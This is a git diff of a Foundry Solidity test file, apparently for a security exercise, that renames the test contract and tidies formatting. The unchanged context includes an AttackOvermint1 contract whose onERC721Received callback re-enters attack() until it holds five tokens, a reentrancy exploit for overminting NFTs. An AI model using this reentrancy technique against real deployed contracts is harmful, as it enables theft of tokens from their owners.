@@ -5,7 +5,7 @@ import {Test, console2} from "forge-std/Test.sol";
 import {Overmint1} from "../src/Overmint1.sol";
 import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
 
-contract PrimeNFTsTest is Test {
+contract Overmint1Test is Test {
     Overmint1 overmint1;
     AttackOvermint1 attackOvermint1;
     address admin;
@@ -27,7 +27,6 @@ contract PrimeNFTsTest is Test {
         attackOvermint1.retrieveTokens();
         assertTrue(overmint1.success(user1));
     }
-
 }
 
 contract AttackOvermint1 {
@@ -55,7 +54,7 @@ contract AttackOvermint1 {
         uint256,
         bytes calldata
     ) external returns (bytes4) {
-        if(overmint1.balanceOf(address(this)) < 5) {
+        if (overmint1.balanceOf(address(this)) < 5) {
             attack();
         }
         return IERC721Receiver.onERC721Received.selector;
